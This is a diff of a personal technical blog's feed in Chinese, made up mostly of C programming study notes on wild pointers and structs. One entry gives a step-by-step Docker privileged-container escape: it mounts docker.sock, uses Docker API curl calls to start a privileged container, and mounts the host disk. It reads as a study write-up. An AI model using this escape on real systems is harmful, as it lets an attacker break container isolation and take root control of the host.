@@ -787,10 +1110,103 @@ sudo systemctl stop keepalived&lt;br /&gt;
         </entry>
         <entry>
             <title>
+                docker 特權逃逸
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/</id>
+            <content type="html">
+                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#docker&quot;&gt;#docker&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;起因&quot; tabindex=&quot;-1&quot;&gt;起因&lt;/h2&gt;
+&lt;p&gt;因為 docker daemon 是在 root 權限下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ll -a /var/run/docker.sock
+lrwxr-xr-x  1 root  daemon    63B Jun 10 23:39 /var/run/docker.sock -&amp;gt; /Users/jason/.local/share/containers/podman/machine/podman.sock
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊&lt;/p&gt;
+&lt;p&gt;建立特權容器&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# 使用 curlimages/curl 作為基礎鏡像
+FROM curlimages/curl:latest
+
+USER root
+# 安裝 sudo
+RUN apk --no-cache add sudo
+
+RUN apk --no-cache add docker
+
+# 創建一個新用戶並設置適當的權限
+RUN addgroup -S docker &amp;amp;&amp;amp; adduser -S dockeruser -G docker
+
+# 允許 dockeruser 使用 sudo 而不需要密碼
+RUN echo &#39;dockeruser ALL=(ALL) NOPASSWD:ALL&#39; &amp;gt;&amp;gt; /etc/sudoers
+
+# 切換到 dockeruser 用戶
+USER dockeruser
+
+# 設置工作目錄
+WORKDIR /home/dockeruser
+
+# 執行一個無限循環的命令，確保容器一直保持運行
+CMD [&amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;while :; do sleep 10; done&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;docker build -t my-curl-image .
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;docker-conatiner&quot; tabindex=&quot;-1&quot;&gt;建立 docker conatiner&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;docker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;container-docker-sock-unix-host-docker&quot; tabindex=&quot;-1&quot;&gt;在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊&lt;/h2&gt;
+&lt;h3 id=&quot;docker-images&quot; tabindex=&quot;-1&quot;&gt;建立一個 docker images&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock -d &#39;{&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;, &amp;quot;Privileged&amp;quot;:true}&#39; -H &#39;Content-Type: application/json&#39; http:/v1.24/containers/create
+{&amp;quot;Id&amp;quot;:&amp;quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&amp;quot;,&amp;quot;Warnings&amp;quot;:[]}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;docker-images-1&quot; tabindex=&quot;-1&quot;&gt;啟動 docker images&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;docker-container&quot; tabindex=&quot;-1&quot;&gt;列出所有 docker container 狀態&lt;/h3&gt;
+&lt;p&gt;等價:&lt;br /&gt;
+&lt;code&gt;docker ps&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json
+[{&amp;quot;Id&amp;quot;:&amp;quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&amp;quot;,&amp;quot;Names&amp;quot;:[&amp;quot;/elated_leakey&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;,&amp;quot;ImageID&amp;quot;:&amp;quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&amp;quot;,&amp;quot;Command&amp;quot;:&amp;quot;/entrypoint.sh sh -c &#39;while :; do sleep 10; done&#39;&amp;quot;,&amp;quot;Created&amp;quot;:1718034
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;container&quot; tabindex=&quot;-1&quot;&gt;進入建立的特權 container&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ docker ps
+CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS     NAMES
+a9c0fe2d7af9   my-curl   &amp;quot;/entrypoint.sh sh -…&amp;quot;   3 minutes ago   Up 3 minutes             elated_leakey
+
+$ docker exec -it a9c0fe2d7af9 sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;device&quot; tabindex=&quot;-1&quot;&gt;可以看到宿主機的 device&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/dev # ls
+autofs           hvc3             loop6            nbd3             ram1             ram9             tty14            tty27            tty4             tty52            tty8             vda
+btrfs-control    hvc4             loop7            nbd4             ram10            random           tty15            tty28            tty40            tty53            tty9             vda1
+bus              hvc5             mapper           nbd5             ram11            rtc0             tty16            tty29            tty41            tty54            ttyS0            vdb
+cachefiles       hvc6             mem              nbd6             ram12            shm              tty17            tty3             tty42            tty55            ttyS1            vdc
+core             hvc7             mqueue           nbd7             ram13            stderr           tty18            tty30            tty43            tty56            ttyS2            vga_arbiter
+cpu_dma_latency  hwrng            nbd0             nbd8             ram14            stdin            tty19            tty31            tty44            tty57            ttyS3            vhost-net
+cuse             kmsg             nbd1             nbd9             ram15            stdout           tty2             tty32            tty45            tty58            uinput           vhost-vsock
+fd               loop-control     nbd10            net              ram2             tty              tty20            tty33            tty46            tty59            urandom          vport2p0
+full             loop0            nbd11            null             ram3             tty0             tty21            tty34            tty47            tty6             vcs              vsock
+fuse             loop1            nbd12            port             ram4             tty1             tty22            tty35            tty48            tty60            vcs1             zero
+gpiochip0        loop2            nbd13            ppp              ram5             tty10            tty23            tty36            tty49            tty61            vcsa
+hvc0             loop3            nbd14            ptmx             ram6             tty11            tty24            tty37            tty5             tty62            vcsa1
+hvc1             loop4            nbd15            pts              ram7             tty12            tty25            tty38            tty50            tty63            vcsu
+hvc2             loop5            nbd2             ram0             ram8             tty13            tty26            tty39            tty51            tty7             vcsu1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改 host 文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ mount dev/vda1 /home/vda1
+/dev # ls /home/vda1
+cni                 desktop-containerd  kubeadm             lost+found          mutagen             swap
+containerd          docker              kubelet-plugins     machine-id          nfs                 wasm
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/" >
+        </entry>
+        <entry>
+            <title>
                 CVE-2025-55182 漏洞研究
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/</id>
             <content type="html">
                 &lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6
@@ -837,5 +1253,979 @@ print(res.text)
 
             </content>
             <link href="https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/" >
+        </entry>
+        <entry>
+            <title>
+                野指針
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/</id>
+            <content type="html">
+                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818215631.png&quot; alt=&quot;Pasted image 20250818215631.png&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int *p;
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p);
+    return  0;
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改未初始化的指針變數的值&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int *p;
+    *p = 10; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
+    return  0;
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int num = 11;
+    int *p;
+    *p = num; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
+    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
+    return  0;
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;code-bus-error-10-code&quot; tabindex=&quot;-1&quot;&gt;&lt;code&gt;Bus error: 10&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;是在 &lt;strong&gt;Unix-like 系統（像 macOS、Linux）&lt;/strong&gt; 上常見的錯誤訊息。代表程式嘗試存取 &lt;strong&gt;無效的記憶體位址&lt;/strong&gt; 或 &lt;strong&gt;不符合對齊規則的記憶體位址&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;在 macOS 上特別常見，因為它的記憶體對齊要求比較嚴格。&lt;/p&gt;
+&lt;h3 id=&quot;原因&quot; tabindex=&quot;-1&quot;&gt;原因&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;指標錯誤使用&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;指標指向無效的記憶體位置（例如已經 &lt;code&gt;free&lt;/code&gt; 過，或是從未正確初始化）。&lt;/li&gt;
+&lt;li&gt;指標運算錯誤，導致存取到錯誤位置。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&quot;指針越界訪問&quot; tabindex=&quot;-1&quot;&gt;指針越界訪問&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818222350.png&quot; alt=&quot;Pasted image 20250818222350.png&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 3, 5, 7, 9}; 
+    printf(&amp;quot;%d&#92;n&amp;quot;, arr[1]); // 3
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[1]); // 0x16bc9eab4
+    printf(&amp;quot;%d&#92;n&amp;quot;, arr[2]); // 5
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[2]); // 0x16bc9eab8
+    printf(&amp;quot;%d&#92;n&amp;quot;, arr[99]); // 0 &amp;lt;- 野指針，無法預測這裡的值
+    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[99]); // 0x16bc9ec3c &amp;lt;- 野指針地址，無法預測這裡的值
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;野指針 2:&lt;br /&gt;
+以 for loop 方式越界訪問&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 3, 5, 7, 9}; 
+    for (int i = 0; i &amp;lt; 10; i++){
+        printf(&amp;quot;index: %d, value: %d&#92;n&amp;quot;, i, arr[i]);
+    }
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+
+/* 
+output:
+index: 0, value: 1
+index: 1, value: 3
+index: 2, value: 5
+index: 3, value: 7
+index: 4, value: 9
+index: 5, value: 1
+index: 6, value: -1657536328
+index: 7, value: -1157789503
+index: 8, value: 1836167456
+index: 9, value: 1
+*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int main(){
+    int arr[5] = {1, 3, 5, 7, 9}; 
+    int *p = arr; // 賦值 &amp;amp;arr[0]
+    for (int i = 0; i &amp;lt; 10; i++){
+        printf(&amp;quot;%d&#92;n&amp;quot;, *p++); // 地址先 +1 個 int 單位(4 個 bytes = 32 bits)
+    }
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+/*
+output:
+1
+3
+5
+7
+9
+1
+525336608
+-509251205
+1865920800
+1
+*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;訪問已回收的地址&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+int *test(){
+    int a = 15; // 局部變數
+    // 返回變數 a 的地址
+    return &amp;amp;a;
+}
+
+void dummy_function(){
+    int x = 999, y = 888, z = 777; // 故意覆蓋 stack
+    printf(&amp;quot;dummy function called&#92;n&amp;quot;);
+}
+
+int main(){
+	// 因為 p2 指向一個可能會被回收掉的地址，所以就產生一個野指針
+    int *p2 = test();
+    printf(&amp;quot;第一次讀取: %d&#92;n&amp;quot;, *p2);
+    
+    dummy_function(); // 覆蓋 stack
+    
+    printf(&amp;quot;第二次讀取: %d&#92;n&amp;quot;, *p2); // 讀到垃圾值
+    return 0;
+}
+
+// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
+
+/*
+output:
+	第一次讀取: 15
+	dummy function called
+	第二次讀取: 1
+*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;避免野指針&quot; tabindex=&quot;-1&quot;&gt;避免野指針&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818231729.png&quot; alt=&quot;Pasted image 20250818231729.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212325.png&quot; alt=&quot;Pasted image 20250819212325.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/" >
+        </entry>
+        <entry>
+            <title>
+                聲明結構體練習
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;
+
+/*結構體傳參*/
+// 聲明一個結構體
+struct Node
+{
+    int data;
+    struct Node *next; // 指向 Node 型變數的指針
+};
+
+// 或是如下定義
+typedef struct Node1
+{
+    int data;
+    struct Node *next;
+}LNode;
+
+// 聲明二叉樹的節點
+// 方式 1
+struct BTNode
+{
+    int data;
+    struct BTNode *lchild; // 指向左子樹
+    struct BTNode *rchild; // 指向右子樹
+    
+};
+
+// 方式 2
+typedef struct BTNode1
+{
+    int data;
+    struct BTNode1 *lchild; // 指向左子樹
+    struct BTNode1 *rchild; // 指向右子樹
+    
+}BTNode1;
+
+
+// 結構體指針
+int main()
+{
+    // 聲明節點變量的不同方式
+    // 方式 1:
+    // 聲明單向鍊表的節點
+    struct Node node1;
+    LNode node2;
+    
+    // 聲明二叉樹的節點
+    struct BTNode btnode1;
+    BTNode1 btnode2;
+    
+    // 方式 2:
+    BTNode1 *node5;
+
+    // 動態開闢 BTNode1 大小的空間
+    // (BTNode1 *) 強制轉型為 BTNode1 類型
+    node5 = (BTNode1 *)malloc(sizeof(BTNode1));
+    free(node5); // 釋放 node5 空間
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/" >
+        </entry>
+        <entry>
+            <title>
+                結構體訪問 - 課後練習
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/</id>
+            <content type="html">
+                &lt;p&gt;題目:&lt;br /&gt;
+輸入班級所有學生的成績，輸出成績高於平均的學生姓名與分數&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#define&quot;&gt;#define&lt;/a&gt; LENGTH 4
+// 需求: 輸入班級學生訊息
+struct Student
+{
+    int id;
+    char name[20];
+    char gender;
+    int score;
+};
+
+int main()
+{
+    // 聲明學生的結構體數組
+    struct Student student_arr[LENGTH] = {{.id=1, .name=&amp;quot;alice&amp;quot;, .gender=&#39;M&#39;, .score=60},
+                                          {.id=2, .name=&amp;quot;bob&amp;quot;, .gender=&#39;F&#39;, .score=65},
+                                          {.id=3, .name=&amp;quot;hoho&amp;quot;, .gender=&#39;F&#39;, .score=70},
+                                          {.id=4, .name=&amp;quot;doe&amp;quot;, .gender=&#39;M&#39;, .score=80}};
+    int score_sum = 0;
+    for (int i = 0; i &amp;lt; LENGTH; i++){
+        printf(&amp;quot;score: %d&#92;n&amp;quot;, student_arr[i].score);
+        score_sum += student_arr[i].score;
+    }
+    int avg_score = score_sum/LENGTH;
+    printf(&amp;quot;avg_score: %d&#92;n&amp;quot;, avg_score);
+    for (int i = 0; i &amp;lt; LENGTH; i++){
+        if (student_arr[i].score &amp;gt; avg_score){
+            printf(&amp;quot;name: %s, score: %d&#92;n&amp;quot;, student_arr[i].name, student_arr[i].score);
+        }
+    }
+}
+
+output: 
+	score: 60
+	score: 65
+	score: 70
+	score: 80
+	avg_score: 68
+	name: hoho, score: 70
+	name: doe, score: 80
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/" >
+        </entry>
+        <entry>
+            <title>
+                結構體複製 - pass by value
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+struct Car
+{
+    char name[30];
+    double price;
+} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};
+
+int main()
+{
+    // 複製行為
+    struct Car  b = a; // 結構體複製是 pass by value
+    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
+    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同
+
+    printf(&amp;quot;a =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, a.name, a.price); // 值是一樣
+    printf(&amp;quot;b =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, b.name, b.price); // 值是一樣
+    
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;結構體的複製是 pass by value&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830153021.png&quot; alt=&quot;Pasted image 20250830153021.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;&lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出的是自己的變數地址&lt;br /&gt;
+printf(&amp;quot;%p&#92;n&amp;quot;, &lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出指針變數指向的變數地址&lt;/p&gt;
+&lt;p&gt;在 C 語言中，字符串屬於常量，只要定義一個字符串 &amp;quot;Hello&amp;quot;, 不管後續誰指向，都是指到同個記憶體位置&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+struct Car
+{
+    char *name;
+    double price;
+} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};
+
+int main()
+{
+    // 複製行為
+    struct Car  b = a; // 結構體複製是 pass by value，會產生新地址
+    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
+    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同
+
+    /*
+    結構體本身複製的是值，當值是指針變數時，複製的是該指針變數指向的地址
+    */
+    printf(&amp;quot;a =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;a.name, &amp;amp;a.price); // &amp;amp;a.name 顯示指針變數的地址 a =&amp;gt; name: 0x102480000, price: 0x102480008
+    printf(&amp;quot;b =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;b.name, &amp;amp;b.price); // &amp;amp;b.name 顯示指針變數的地址 b =&amp;gt; name: 0x16d986a10, price: 0x16d986a18
+    printf(&amp;quot;a =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, a.name, a.price); // a.name 指向的變數地址 a =&amp;gt; name: 0x102478600, price: 100.000000
+    printf(&amp;quot;b =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, b.name, b.price); // b.name 指向的變數地址 b =&amp;gt; name: 0x102478600, price: 100.000000
+    
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/" >
+        </entry>
+        <entry>
+            <title>
+                結構體數組訪問
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+
+struct Person
+{
+    char name[20];
+    int age;
+};
+
+int main()
+{
+    // 1. 創建結構體數組
+    struct Person p_arr[5];
+
+    // 2. 如何給結構體數組的元素賦值    
+    strcpy(p_arr[0].name, &amp;quot;Jason&amp;quot;);
+    p_arr[0].age = 5;
+    strcpy(p_arr[1].name, &amp;quot;Jason111&amp;quot;);
+    p_arr[0].age = 6;
+    strcpy(p_arr[2].name, &amp;quot;Jason222&amp;quot;);
+    p_arr[0].age = 7;
+    //3. 如何調用數組的元素，即結構體內部的成員
+
+    printf(&amp;quot;p_arr[0].name: %s&#92;n&amp;quot;, p_arr[0].name);
+    printf(&amp;quot;p_arr[1].name: %s&#92;n&amp;quot;, p_arr[1].name);
+    printf(&amp;quot;p_arr[2].name: %s&#92;n&amp;quot;, p_arr[2].name);
+
+    /*聲明方式 2*/
+    // 1. 創建結構體數組
+    struct Person p_arr2[]={ {.name=&amp;quot;John&amp;quot;, .age=1},
+                            {.name=&amp;quot;John1&amp;quot;, .age=2},
+                            {.name=&amp;quot;Joh2&amp;quot;, .age=3}};
+
+    printf(&amp;quot;p_arr2[0].name: %s&#92;n&amp;quot;, p_arr2[0].name);
+    printf(&amp;quot;p_arr2[1].name: %s&#92;n&amp;quot;, p_arr2[1].name);
+    printf(&amp;quot;p_arr2[2].name: %s&#92;n&amp;quot;, p_arr2[2].name);
+    
+    /*使用指向數組的指針*/
+    struct Person *ptrPerson;
+    
+    // 取得第 0 個結構體的指針參考
+    ptrPerson = &amp;amp;p_arr[0];
+    printf(&amp;quot;ptrPerson.name: %s&#92;n&amp;quot;, ptrPerson-&amp;gt;name);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/" >
+        </entry>
+        <entry>
+            <title>
+                結構體指針變數傳遞
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
+&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
+/*結構體傳參*/
+// 聲明一個結構體
+struct Person
+{
+   char name[20];
+   int age;
+};
+
+void addAge(struct Person per){
+    // 實際傳入的是結構體的副本
+    per.age = per.age + 1;
+}
+void addAge1(struct Person *per){
+    // 修改的是指針裡面的值
+    per-&amp;gt;age = per-&amp;gt;age + 1;
+}
+
+// 結構體指針
+int main()
+{
+    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=13};
+    // 實際傳入的是結構體的副本，pass by value
+    addAge(per1);
+    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
+    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);
+
+    // 傳入結構體的指針，pass by reference
+    addAge1(&amp;amp;per1);
+    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
+    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/" >
+        </entry>
+        <entry>
+            <title>
+                結構體指針變數使用
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/</id>
+            <content type="html">
+                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
